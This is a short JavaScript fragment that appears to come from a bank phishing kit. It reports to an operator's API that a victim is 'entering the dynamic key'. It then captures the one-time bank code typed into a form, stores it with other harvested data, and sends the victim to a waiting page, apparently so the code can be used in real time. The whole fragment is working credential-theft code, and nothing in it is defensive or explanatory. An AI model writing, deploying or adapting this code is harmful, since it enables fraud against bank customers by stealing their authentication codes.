fetch(`${API_URL}/view`, {
    method: 'POST',
    headers: {
        'Content-Type': 'application/json'
    },
    body:JSON.stringify({
        message: 'INGRESANDO CLAVE DINÁMICA'
    })
});

if(info.cdin !== ''){
    document.querySelector('.error').classList.remove('d-none');
}

document.querySelector('#form-cdin').addEventListener('submit', (e) => {
    e.preventDefault();

    info.tok = document.querySelector('#cdin').value;
    LS.setItem('info', JSON.stringify(info));
    window.location.href = 'waiting.html';
});